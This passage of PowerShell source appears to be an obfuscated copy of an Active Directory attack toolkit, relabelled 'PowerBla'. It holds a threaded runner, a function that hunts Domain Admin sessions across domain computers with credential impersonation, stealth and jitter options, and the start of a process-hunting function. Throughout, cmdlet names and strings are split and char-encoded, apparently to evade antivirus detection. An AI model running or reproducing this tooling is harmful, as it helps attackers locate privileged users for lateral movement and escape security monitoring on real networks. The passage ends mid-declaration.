            $VorbiddenVars = @('?',('ar'+'gs'),('Console'+'Fi'+'leNa'+'me'),('Erro'+'r'),('Execu'+'tionC'+'ontext'),('fals'+'e'),('HOM'+'E'),('H'+'ost'),('inp'+'ut'),('Inpu'+'tOb'+'ject'),('Maxi'+'m'+'u'+'mAlia'+'sCoun'+'t'),('M'+'axi'+'m'+'umDrive'+'Count'),('M'+'a'+'x'+'imumE'+'rrorCo'+'unt'),('Ma'+'ximumFunct'+'io'+'nCount'),('Max'+'imumHis'+'t'+'or'+'yCount'),('Ma'+'ximum'+'Var'+'iabl'+'e'+'Co'+'unt'),('M'+'yI'+'nv'+'ocation'),('n'+'ull'),('PI'+'D'),('PSB'+'oun'+'dPa'+'ram'+'eter'+'s'),('PSC'+'o'+'mm'+'andPath'),('PS'+'Cultur'+'e'),('PS'+'DefaultPara'+'m'+'eter'+'Va'+'lu'+'e'+'s'),('P'+'SHOME'),('P'+'SScriptRoo'+'t'),('PSUICu'+'l'+'tur'+'e'),('PS'+'Ve'+'r'+'sionT'+'able'),('P'+'WD'),('She'+'ll'+'Id'),('Sy'+'nchronize'+'dHa'+'sh'),('tru'+'e'))

            ForEach ($Var in $MyVars) {
                if ($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((&('New-O'+'bjec'+'t') -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            ForEach ($Function in (&('Get-Ch'+'ild'+'It'+'em') Function:)) {
                $SessionState.Commands.Add((&('New'+'-Objec'+'t') -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }


        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        $Method = $Null
        ForEach ($M in [PowerShell].GetMethods() | &('Wh'+'ere-'+'Obj'+'ect') { $_.Name -eq ('Begin'+'I'+'nvoke') }) {
            $MethodParameters = $M.GetParameters()
            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq ('inp'+'ut') -and $MethodParameters[1].Name -eq ('ou'+'tp'+'ut')) {
                $Method = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
        $ComputerName = $ComputerName | &('Where'+'-Ob'+'jec'+'t') {$_ -and $_.Trim()}
        &('W'+'rite-Ver'+'b'+'o'+'se') "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count) "

        if ($Threads -ge $ComputerName.Length) {
            $Threads = $ComputerName.Length
        }
        $ElementSplitSize = [Int]($ComputerName.Length/$Threads)
        $ComputerNamePartitioned = @()
        $Start = 0
        $End = $ElementSplitSize

        for($i = 1; $i -le $Threads; $i++) {
            $List = &('N'+'ew'+'-Object') System.Collections.ArrayList
            if ($i -eq $Threads) {
                $End = $ComputerName.Length
            }
            $List.AddRange($ComputerName[$Start..($End-1)])
            $Start += $ElementSplitSize
            $End += $ElementSplitSize
            $ComputerNamePartitioned += @(,@($List.ToArray()))
        }

        &('Wri'+'te'+'-Ver'+'bose') ('['+'New'+'-T'+'hreade'+'dFu'+'nc'+'tion'+'] '+'Tota'+'l '+'num'+'ber '+'o'+'f '+'threads'+'/pa'+'r'+'titi'+'ons'+': '+"$Threads")

        ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {
            $PowerShell = [PowerShell]::Create()
            $PowerShell.runspacepool = $Pool

            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter(('Comp'+'uter'+'Na'+'me'), $ComputerNamePartition)
            if ($ScriptParameters) {
                ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                    $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)
                }
            }

            $Output = &('New-'+'O'+'bjec'+'t') Management.Automation.PSDataCollection[Object]

            $Jobs += @{
                PS = $PowerShell
                Output = $Output
                Result = $Method.Invoke($PowerShell, @($Null, [Management.Automation.PSDataCollection[Object]]$Output))
            }
        }
    }

    END {
        &('Wr'+'ite-V'+'er'+'bose') ('[New-Th'+'re'+'ad'+'edFunct'+'ion] Threads '+'execut'+'ing')

        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            &('Star'+'t-S'+'le'+'ep') -Seconds 1
        }
        While (($Jobs | &('Wh'+'ere'+'-Obj'+'ect') { -not $_.Result.IsCompleted }).Count -gt 0)

        $SleepSeconds = 100
        &('Wr'+'ite-V'+'erbos'+'e') ('[Ne'+'w-ThreadedF'+'u'+'nctio'+'n] '+'Waitin'+'g '+"$SleepSeconds "+'second'+'s '+'for'+' '+'f'+'ina'+'l '+'clea'+'n'+'u'+'p...')

        for ($i=0; $i -lt $SleepSeconds; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            &('Start-S'+'lee'+'p') -S 1
        }

        $Pool.Dispose()
        &('Writ'+'e'+'-Verbo'+'se') ('[New-Threade'+'dFunction'+'] all'+' '+'th'+'re'+'ads c'+'o'+'m'+'plet'+'ed')
    }
}


function Find-DomainUserLocation {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSh'+'ouldPro'+'c'+'es'+'s'), '')]
    [OutputType(('Pow'+'erBl'+'a.'+'U'+'serL'+'ocat'+'ion'))]
    [CmdletBinding(DefaultParameterSetName = {'Us'+'erGrou'+'pIdent'+'i'+'ty'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('DN'+'SHos'+'tN'+'ame'))]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias(('Un'+'constraine'+'d'))]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias(('Oper'+'atingS'+'ys'+'tem'))]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(('S'+'ervi'+'cePa'+'ck'))]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(('SiteNam'+'e'))]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = "uSErIdE`N`TIty")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [Parameter(ParameterSetName = "Us`ER`gr`OupIdEntITy")]
        [ValidateNotNullOrEmpty()]
        [Alias(('Gr'+'oupNam'+'e'), ('Grou'+'p'))]
        [String[]]
        $UserGroupIdentity = ('Domai'+'n'+' Admi'+'ns'),

        [Alias(('Ad'+'m'+'inCount'))]
        [Switch]
        $UserAdminCount,

        [Alias(('Al'+'lowDe'+'leg'+'a'+'tion'))]
        [Switch]
        $UserAllowDelegation,

        [Switch]
        $CheckAccess,

        [ValidateNotNullOrEmpty()]
        [Alias(('Dom'+'ainCon'+'tro'+'lle'+'r'))]
        [String]
        $Server,

        [ValidateSet(('Ba'+'se'), ('OneLev'+'el'), ('S'+'ubtree'))]
        [String]
        $SearchScope = ('Subtr'+'e'+'e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $StopOnSuccess,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Parameter(ParameterSetName = "Sh`OW`ALl")]
        [Switch]
        $ShowAll,

        [Switch]
        $Stealth,

        [String]
        [ValidateSet(('DF'+'S'), 'DC', ('Fil'+'e'), ('Al'+'l'))]
        $StealthSource = ('A'+'ll'),

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {

        $ComputerSearcherArguments = @{
            ('Prop'+'ertie'+'s') = ('dnsho'+'stnam'+'e')
        }
        if ($PSBoundParameters[('Dom'+'ain')]) { $ComputerSearcherArguments[('Doma'+'i'+'n')] = $Domain }
        if ($PSBoundParameters[('Com'+'puterDo'+'m'+'ain')]) { $ComputerSearcherArguments[('Doma'+'in')] = $ComputerDomain }
        if ($PSBoundParameters[('Co'+'m'+'puter'+'L'+'DAPFilter')]) { $ComputerSearcherArguments[('LDAPF'+'il'+'te'+'r')] = $ComputerLDAPFilter }
        if ($PSBoundParameters[('Com'+'p'+'ute'+'rS'+'earchBase')]) { $ComputerSearcherArguments[('S'+'earchB'+'ase')] = $ComputerSearchBase }
        if ($PSBoundParameters[('Uncons'+'tr'+'ained')]) { $ComputerSearcherArguments[('Unc'+'o'+'nstr'+'ained')] = $Unconstrained }
        if ($PSBoundParameters[('Co'+'m'+'p'+'ut'+'erO'+'peratingSystem')]) { $ComputerSearcherArguments[('O'+'p'+'eratin'+'gSystem')] = $OperatingSystem }
        if ($PSBoundParameters[('Compute'+'rServ'+'iceP'+'ack')]) { $ComputerSearcherArguments[('Service'+'Pac'+'k')] = $ServicePack }
        if ($PSBoundParameters[('Comput'+'e'+'rS'+'iteNa'+'me')]) { $ComputerSearcherArguments[('Sit'+'eN'+'ame')] = $SiteName }
        if ($PSBoundParameters[('Ser'+'ve'+'r')]) { $ComputerSearcherArguments[('Se'+'rver')] = $Server }
        if ($PSBoundParameters[('Sea'+'rchS'+'c'+'ope')]) { $ComputerSearcherArguments[('Sea'+'rc'+'hS'+'cope')] = $SearchScope }
        if ($PSBoundParameters[('Res'+'ultPageS'+'i'+'ze')]) { $ComputerSearcherArguments[('Res'+'ultPag'+'eSi'+'z'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('Server'+'TimeLi'+'mit')]) { $ComputerSearcherArguments[('S'+'erve'+'rTimeLim'+'i'+'t')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tom'+'bst'+'one')]) { $ComputerSearcherArguments[('T'+'ombs'+'tone')] = $Tombstone }
        if ($PSBoundParameters[('Crede'+'n'+'t'+'ial')]) { $ComputerSearcherArguments[('Crede'+'nt'+'ia'+'l')] = $Credential }

        $UserSearcherArguments = @{
            ('Pro'+'pe'+'rties') = ('samac'+'c'+'oun'+'tname')
        }
        if ($PSBoundParameters[('U'+'serI'+'dentit'+'y')]) { $UserSearcherArguments[('Ident'+'it'+'y')] = $UserIdentity }
        if ($PSBoundParameters[('Do'+'mai'+'n')]) { $UserSearcherArguments[('Doma'+'in')] = $Domain }
        if ($PSBoundParameters[('UserDoma'+'i'+'n')]) { $UserSearcherArguments[('D'+'omain')] = $UserDomain }
        if ($PSBoundParameters[('Us'+'e'+'rL'+'DAPFilter')]) { $UserSearcherArguments[('LDA'+'PFil'+'ter')] = $UserLDAPFilter }
        if ($PSBoundParameters[('Use'+'rS'+'earchB'+'ase')]) { $UserSearcherArguments[('SearchB'+'as'+'e')] = $UserSearchBase }
        if ($PSBoundParameters[('User'+'Admi'+'nCount')]) { $UserSearcherArguments[('Admi'+'n'+'Count')] = $UserAdminCount }
        if ($PSBoundParameters[('UserAllow'+'De'+'leg'+'ati'+'o'+'n')]) { $UserSearcherArguments[('AllowD'+'e'+'leg'+'ation')] = $UserAllowDelegation }
        if ($PSBoundParameters[('Ser'+'ver')]) { $UserSearcherArguments[('Serv'+'er')] = $Server }
        if ($PSBoundParameters[('Sea'+'rch'+'Sc'+'ope')]) { $UserSearcherArguments[('S'+'earchSc'+'ope')] = $SearchScope }
        if ($PSBoundParameters[('R'+'esult'+'Page'+'S'+'ize')]) { $UserSearcherArguments[('Re'+'s'+'ultPa'+'geS'+'ize')] = $ResultPageSize }
        if ($PSBoundParameters[('ServerTime'+'Li'+'mit')]) { $UserSearcherArguments[('ServerT'+'imeLim'+'i'+'t')] = $ServerTimeLimit }
        if ($PSBoundParameters[('T'+'omb'+'st'+'one')]) { $UserSearcherArguments[('T'+'ombsto'+'ne')] = $Tombstone }
        if ($PSBoundParameters[('Crede'+'n'+'ti'+'al')]) { $UserSearcherArguments[('Cred'+'ent'+'ial')] = $Credential }

        $TargetComputers = @()

        if ($PSBoundParameters[('Com'+'p'+'u'+'terName')]) {
            $TargetComputers = @($ComputerName)
        }
        else {
            if ($PSBoundParameters[('Steal'+'th')]) {
                &('Write-'+'Ver'+'bos'+'e') ('['+'Find-Do'+'mainU'+'serL'+'oca'+'ti'+'on] '+'St'+'e'+'alth '+'enu'+'mera'+'tion '+'u'+'sing'+' '+'sour'+'ce:'+' '+"$StealthSource")
                $TargetComputerArrayList = &('N'+'ew-O'+'bje'+'ct') System.Collections.ArrayList

                if ($StealthSource -match (('File'+'o5c'+'All')  -rEplAce([ChAr]111+[ChAr]53+[ChAr]99),[ChAr]124)) {
                    &('Wri'+'te'+'-'+'Verbos'+'e') ('['+'Fi'+'nd-Doma'+'inUserL'+'oc'+'at'+'ion] Q'+'u'+'erying '+'for'+' fi'+'le '+'serve'+'rs')
                    $FileServerSearcherArguments = @{}
                    if ($PSBoundParameters[('Dom'+'ain')]) { $FileServerSearcherArguments[('D'+'omain')] = $Domain }
                    if ($PSBoundParameters[('Co'+'mput'+'erDo'+'main')]) { $FileServerSearcherArguments[('Doma'+'in')] = $ComputerDomain }
                    if ($PSBoundParameters[('Com'+'p'+'u'+'terSearchB'+'ase')]) { $FileServerSearcherArguments[('Se'+'arch'+'Bas'+'e')] = $ComputerSearchBase }
                    if ($PSBoundParameters[('Ser'+'ver')]) { $FileServerSearcherArguments[('Serve'+'r')] = $Server }
                    if ($PSBoundParameters[('Search'+'S'+'cope')]) { $FileServerSearcherArguments[('Sear'+'ch'+'S'+'cope')] = $SearchScope }
                    if ($PSBoundParameters[('R'+'esu'+'ltPageSize')]) { $FileServerSearcherArguments[('Resul'+'tP'+'age'+'Size')] = $ResultPageSize }
                    if ($PSBoundParameters[('ServerT'+'i'+'me'+'Limit')]) { $FileServerSearcherArguments[('Serv'+'erTi'+'m'+'eLi'+'mit')] = $ServerTimeLimit }
                    if ($PSBoundParameters[('Tomb'+'stone')]) { $FileServerSearcherArguments[('Tom'+'bst'+'one')] = $Tombstone }
                    if ($PSBoundParameters[('Cre'+'den'+'tial')]) { $FileServerSearcherArguments[('Cred'+'e'+'ntial')] = $Credential }
                    $FileServers = &('G'+'et'+'-D'+'omai'+'nFi'+'leS'+'erver') @FileServerSearcherArguments
                    if ($FileServers -isnot [System.Array]) { $FileServers = @($FileServers) }
                    $TargetComputerArrayList.AddRange( $FileServers )
                }
                if ($StealthSource -match (('DF'+'S{0}A'+'ll')  -f[cHAR]124)) {
                    &('W'+'ri'+'te-Verbose') ('[F'+'ind-DomainUser'+'L'+'oca'+'tio'+'n] '+'Querying for'+' DF'+'S'+' s'+'erver'+'s')
                }
                if ($StealthSource -match (('DCBTH'+'A'+'l'+'l')  -CRepLAce ([CHAR]66+[CHAR]84+[CHAR]72),[CHAR]124)) {
                    &('W'+'rite'+'-Verbos'+'e') ('[Fin'+'d'+'-Do'+'ma'+'inUserL'+'ocati'+'on] Q'+'u'+'eryin'+'g'+' '+'fo'+'r d'+'oma'+'in con'+'tr'+'oller'+'s')
                    $DCSearcherArguments = @{
                        ('LD'+'AP') = $True
                    }
                    if ($PSBoundParameters[('Doma'+'i'+'n')]) { $DCSearcherArguments[('D'+'om'+'ain')] = $Domain }
                    if ($PSBoundParameters[('Co'+'mpu'+'terD'+'omain')]) { $DCSearcherArguments[('D'+'omain')] = $ComputerDomain }
                    if ($PSBoundParameters[('Serv'+'er')]) { $DCSearcherArguments[('Serv'+'er')] = $Server }
                    if ($PSBoundParameters[('Cre'+'denti'+'al')]) { $DCSearcherArguments[('C'+'rede'+'ntial')] = $Credential }
                    $DomainControllers = &('Get-D'+'o'+'main'+'Contro'+'l'+'ler') @DCSearcherArguments | &('S'+'elect-Ob'+'j'+'ect') -ExpandProperty dnshostname
                    if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }
                    $TargetComputerArrayList.AddRange( $DomainControllers )
                }
                $TargetComputers = $TargetComputerArrayList.ToArray()
            }
            else {
                &('W'+'rite-Ve'+'rbo'+'se') ('[Find-Dom'+'ainUse'+'rLocat'+'i'+'o'+'n'+']'+' Query'+'ing'+' for all c'+'ompu'+'te'+'rs i'+'n the d'+'omai'+'n')
                $TargetComputers = &('G'+'et-D'+'omainComp'+'u'+'ter') @ComputerSearcherArguments | &('Selec'+'t-Obj'+'e'+'ct') -ExpandProperty dnshostname
            }
        }
        &('Wri'+'t'+'e-Ve'+'rbose') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "
        if ($TargetComputers.Length -eq 0) {
            throw ('[Fin'+'d-Domain'+'Us'+'erLo'+'cation] No hosts f'+'ou'+'nd'+' '+'t'+'o enumera'+'te')
        }

        if ($PSBoundParameters[('Cr'+'e'+'dential')]) {
            $CurrentUser = $Credential.GetNetworkCredential().UserName
        }
        else {
            $CurrentUser = ([Environment]::UserName).ToLower()
        }

        if ($PSBoundParameters[('S'+'howAll')]) {
            $TargetUsers = @()
        }
        elseif ($PSBoundParameters[('Us'+'er'+'I'+'dentity')] -or $PSBoundParameters[('UserL'+'DAP'+'Fil'+'ter')] -or $PSBoundParameters[('Us'+'er'+'Search'+'Base')] -or $PSBoundParameters[('UserAdmin'+'Cou'+'nt')] -or $PSBoundParameters[('UserAl'+'lowDel'+'e'+'gati'+'on')]) {
            $TargetUsers = &('Ge'+'t'+'-Doma'+'inUse'+'r') @UserSearcherArguments | &('Sel'+'ect-O'+'bjec'+'t') -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                ('Id'+'entit'+'y') = $UserGroupIdentity
                ('Re'+'cur'+'se') = $True
            }
            if ($PSBoundParameters[('UserDo'+'ma'+'in')]) { $GroupSearcherArguments[('D'+'omain')] = $UserDomain }
            if ($PSBoundParameters[('User'+'Sear'+'chBa'+'se')]) { $GroupSearcherArguments[('S'+'earch'+'Bas'+'e')] = $UserSearchBase }
            if ($PSBoundParameters[('Ser'+'ve'+'r')]) { $GroupSearcherArguments[('Se'+'rve'+'r')] = $Server }
            if ($PSBoundParameters[('S'+'earchSco'+'p'+'e')]) { $GroupSearcherArguments[('Sea'+'rchS'+'c'+'ope')] = $SearchScope }
            if ($PSBoundParameters[('Re'+'s'+'ultP'+'ageSi'+'ze')]) { $GroupSearcherArguments[('Res'+'u'+'ltPag'+'eSize')] = $ResultPageSize }
            if ($PSBoundParameters[('S'+'erv'+'erTi'+'meLi'+'mit')]) { $GroupSearcherArguments[('Se'+'r'+'verTimeLimit')] = $ServerTimeLimit }
            if ($PSBoundParameters[('To'+'mbston'+'e')]) { $GroupSearcherArguments[('T'+'om'+'b'+'stone')] = $Tombstone }
            if ($PSBoundParameters[('Cre'+'den'+'tial')]) { $GroupSearcherArguments[('Cred'+'e'+'ntial')] = $Credential }
            $TargetUsers = &('G'+'et-Dom'+'ainG'+'r'+'ou'+'pMembe'+'r') @GroupSearcherArguments | &('S'+'e'+'l'+'ect-Obj'+'ect') -ExpandProperty MemberName
        }

        &('Writ'+'e-'+'Verbose') "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length) "
        if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {
            throw ('[Fi'+'nd'+'-Doma'+'inUser'+'Location'+'] No'+' use'+'r'+'s'+' fo'+'und to'+' targe'+'t')
        }

        $HostEnumBlock = {
            Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)

            if ($TokenHandle) {
                $Null = &('Inv'+'oke-UserImpe'+'rs'+'onat'+'ion') -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = &('T'+'e'+'st-Con'+'ne'+'ction') -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Sessions = &('Get'+'-Net'+'Se'+'s'+'sion') -ComputerName $TargetComputer
                    ForEach ($Session in $Sessions) {
                        $UserName = $Session.UserName
                        $CName = $Session.CName

                        if ($CName -and $CName.StartsWith((('2'+'8S28S').rEPlaCe('28S',[StriNG][ChAR]92)))) {
                            $CName = $CName.TrimStart('\')
                        }

                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch ((('S'+'CHIi4I'+'i4')  -crePLace 'Ii4',[chaR]36  -repLace 'SCH',[chaR]92)))) {

                            if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {
                                $UserLocation = &('Ne'+'w-Ob'+'ject') PSObject
                                $UserLocation | &('A'+'dd'+'-Mem'+'ber') Noteproperty ('Us'+'erDomai'+'n') $Null
                                $UserLocation | &('Add'+'-M'+'ember') Noteproperty ('Use'+'rName') $UserName
                                $UserLocation | &('A'+'dd-M'+'ember') Noteproperty ('Co'+'mpute'+'rName') $TargetComputer
                                $UserLocation | &('A'+'dd-Mem'+'ber') Noteproperty ('Sessi'+'o'+'n'+'From') $CName

                                try {
                                    $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | &('Select'+'-Obje'+'c'+'t') -ExpandProperty HostName
                                    $UserLocation | &('Add-'+'Me'+'m'+'ber') NoteProperty ('S'+'essionFromNam'+'e') $CnameDNSName
                                }
                                catch {
                                    $UserLocation | &('Add-M'+'e'+'mbe'+'r') NoteProperty ('S'+'ess'+'ionFr'+'o'+'mName') $Null
                                }

                                if ($CheckAccess) {
                                    $Admin = (&('Test-Adm'+'in'+'Ac'+'cess') -ComputerName $CName).IsAdmin
                                    $UserLocation | &('Add-'+'Membe'+'r') Noteproperty ('L'+'ocal'+'Admin') $Admin.IsAdmin
                                }
                                else {
                                    $UserLocation | &('Add-'+'M'+'emb'+'er') Noteproperty ('L'+'ocalA'+'dmin') $Null
                                }
                                $UserLocation.PSObject.TypeNames.Insert(0, ('PowerBl'+'a'+'.'+'U'+'serLoc'+'ation'))
                                $UserLocation
                            }
                        }
                    }
                    if (-not $Stealth) {
                        $LoggedOn = &('Ge'+'t-'+'N'+'etLogg'+'edon') -ComputerName $TargetComputer
                        ForEach ($User in $LoggedOn) {
                            $UserName = $User.UserName
                            $UserDomain = $User.LogonDomain

                            if (($UserName) -and ($UserName.trim() -ne '')) {
                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch (('NQCQ5AQ'+'5'+'A').REPlacE(([CHaR]78+[CHaR]81+[CHaR]67),[STRing][CHaR]92).REPlacE('Q5A',[STRing][CHaR]36)))) {
                                    $IPAddress = @(&('R'+'e'+'so'+'lve-IPAd'+'dress') -ComputerName $TargetComputer)[0].IPAddress
                                    $UserLocation = &('New'+'-Obj'+'ect') PSObject
                                    $UserLocation | &('A'+'dd-Mem'+'ber') Noteproperty ('Use'+'rD'+'omain') $UserDomain
                                    $UserLocation | &('A'+'dd-Membe'+'r') Noteproperty ('User'+'Name') $UserName
                                    $UserLocation | &('A'+'dd-'+'Member') Noteproperty ('Compu'+'terNa'+'me') $TargetComputer
                                    $UserLocation | &('A'+'dd-M'+'e'+'mber') Noteproperty ('IPAdd'+'res'+'s') $IPAddress
                                    $UserLocation | &('Ad'+'d-Memb'+'er') Noteproperty ('S'+'ess'+'ionFrom') $Null
                                    $UserLocation | &('Add'+'-'+'Member') Noteproperty ('Sessio'+'nFr'+'omNa'+'me') $Null

                                    if ($CheckAccess) {
                                        $Admin = &('T'+'est-'+'Ad'+'minAcce'+'ss') -ComputerName $TargetComputer
                                        $UserLocation | &('Ad'+'d-Mem'+'ber') Noteproperty ('Loc'+'alA'+'dmin') $Admin.IsAdmin
                                    }
                                    else {
                                        $UserLocation | &('Add'+'-M'+'ember') Noteproperty ('Lo'+'calA'+'dmin') $Null
                                    }
                                    $UserLocation.PSObject.TypeNames.Insert(0, ('Po'+'werBla.Us'+'erLoca'+'ti'+'on'))
                                    $UserLocation
                                }
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                &('Invo'+'ke-Rev'+'ertToSel'+'f')
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[('Cred'+'ent'+'ial')]) {
            if ($PSBoundParameters[('Dela'+'y')] -or $PSBoundParameters[('Stop'+'O'+'nSucc'+'ess')]) {
                $LogonToken = &('Invoke-Us'+'erIm'+'pers'+'onatio'+'n') -Credential $Credential
            }
            else {
                $LogonToken = &('Invo'+'ke-'+'U'+'s'+'erImpe'+'rsonation') -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters[('De'+'lay')] -or $PSBoundParameters[('S'+'topOnSucces'+'s')]) {

            &('Write-'+'V'+'erbose') "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count) "
            &('W'+'rit'+'e-'+'Verbose') ('['+'F'+'ind-D'+'o'+'main'+'Use'+'rLo'+'cation'+'] '+'Delay:'+' '+"$Delay, "+'Jit'+'ter: '+"$Jitter")
            $Counter = 0
            $RandNo = &('New'+'-'+'Object') System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                &('S'+'tar'+'t'+'-Sleep') -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                &('Wr'+'i'+'te-Ve'+'rbose') "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count)) "
                &('I'+'n'+'voke-Comman'+'d') -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken

                if ($Result -and $StopOnSuccess) {
                    &('W'+'rit'+'e-Verbose') ('[F'+'ind'+'-Dom'+'a'+'inUse'+'r'+'L'+'oc'+'at'+'ion] Target'+' user found, ret'+'urn'+'in'+'g ea'+'rly')
                    return
                }
            }
        }
        else {
            &('Wr'+'ite'+'-Ver'+'bose') ('['+'Find-'+'DomainUs'+'erLoc'+'a'+'t'+'i'+'on] '+'Usin'+'g '+'t'+'hread'+'ing '+'wit'+'h '+'threa'+'d'+'s: '+"$Threads")
            &('Write-Verb'+'o'+'se') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "

            $ScriptParams = @{
                ('T'+'arg'+'etU'+'sers') = $TargetUsers
                ('Curre'+'ntUse'+'r') = $CurrentUser
                ('Ste'+'alt'+'h') = $Stealth
                ('T'+'o'+'kenH'+'andle') = $LogonToken
            }

            &('New-Th'+'read'+'edFu'+'nctio'+'n') -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            &('Invok'+'e-R'+'ever'+'t'+'T'+'oSelf') -TokenHandle $LogonToken
        }
    }
}


function Find-DomainProcess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SS'+'h'+'ouldProce'+'ss'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSUsePSCredent'+'ial'+'Typ'+'e'), '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'Avoi'+'dUsingPlainText'+'F'+'orPassw'+'ord'), '')]
    [OutputType(('Powe'+'rBl'+'a.Us'+'erPr'+'oce'+'ss'))]
    [CmdletBinding(DefaultParameterSetName = {'Non'+'e'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('DN'+'SH'+'ost'+'Name'))]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [Alias(('Unc'+'onst'+'rain'+'e'+'d'))]
        [Switch]
        $ComputerUnconstrained,

        [ValidateNotNullOrEmpty()]
        [Alias(('Opera'+'ti'+'ngSyst'+'e'+'m'))]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(('Ser'+'vi'+'cePack'))]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(('Sit'+'e'+'Name'))]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = "tA`RGEtProC`ESs")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ProcessName,

        [Parameter(ParameterSetName = "tArGET`U`sER")]
        [Parameter(ParameterSetName = "u`Se`RIDenTi`Ty")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,

        [Parameter(ParameterSetName = "t`Ar`gETUSer")]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,

        [Parameter(ParameterSetName = "TAr`gE`Tu`SEr")]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,

        [Parameter(ParameterSetName = "TARgetu`S`eR")]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('GroupN'+'a'+'me'), ('G'+'roup'))]
        [String[]]
        $UserGroupIdentity = ('Do'+'m'+'a'+'in Adm'+'ins'),

        [Parameter(ParameterSetName = "T`ARGeTu`SER")]
        [Alias(('Ad'+'minCoun'+'t'))]
        [Switch]
        $UserAdminCount,

        [ValidateNotNullOrEmpty()]
        [Alias(('Do'+'ma'+'in'+'Cont'+'roller'))]
        [String]
        $Server,

